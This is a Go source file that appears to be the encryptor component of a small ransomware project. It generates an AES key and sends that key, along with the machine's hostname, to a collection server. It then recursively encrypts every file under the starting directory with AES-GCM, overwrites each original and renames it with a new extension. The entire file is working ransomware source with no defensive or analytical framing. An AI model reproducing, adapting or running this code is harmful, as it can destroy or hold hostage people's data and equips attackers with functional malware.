package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

const (
	serverURL = "http://localhost:8080" // Server Address
	extension = ".encryptedeeznuts"     // File Extension after encrypting
	rootDir   = "."                     // Directory To start encrypting from
)

func main() {
	serverUp := checkServer()
	if !serverUp {
		log.Fatal("Server is down!")
	}
	key := createKey()
	sendKey(&key)
	traverseDir(rootDir, &key)
}

func checkServer() bool {
	_, err := http.Get(serverURL)
	return err == nil
}

func createKey() string {
	bytes := make([]byte, 32)
	if _, err := rand.Read(bytes); err != nil {
		log.Fatal(err.Error())
	}
	return hex.EncodeToString(bytes)
}

func sendKey(key *string) {
	h, err := os.Hostname()
	if err != nil {
		log.Fatal(err)
	}
	url := serverURL + "/add"
	jsonString := []byte(fmt.Sprintf(`{"%s": "%s"}`, h, *key))
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonString))
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
}

func traverseDir(path string, key *string) {
	files, err := ioutil.ReadDir(path)
	// Files to ignore while encrypting
	ignore := map[string]bool{".git": true, ".gitignore": true, "encryptor.go": true, "server": true, "decryptor.go": true}
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		name := f.Name()
		if _, ok := ignore[name]; !ok {
			if f.IsDir() {
				traverseDir(path+"/"+name, key)
			} else {
				encryptFile(path+"/"+name, key)
			}
		}
	}
}

func encryptFile(path string, key *string) {
	c, err := ioutil.ReadFile(path)
	contents := hex.EncodeToString(c)
	if err != nil {
		log.Fatal(err)
	}
	k, _ := hex.DecodeString(*key)
	plaintext := []byte(contents)
	block, err := aes.NewCipher(k)
	if err != nil {
		panic(err.Error())
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	encrypted := aesGCM.Seal(nonce, nonce, plaintext, nil)
	err = os.WriteFile(path, encrypted, 0644)
	if err != nil {
		log.Fatal(err)
	}
	err = os.Rename(path, path+extension)
	if err != nil {
		log.Fatal(err)
	}
}
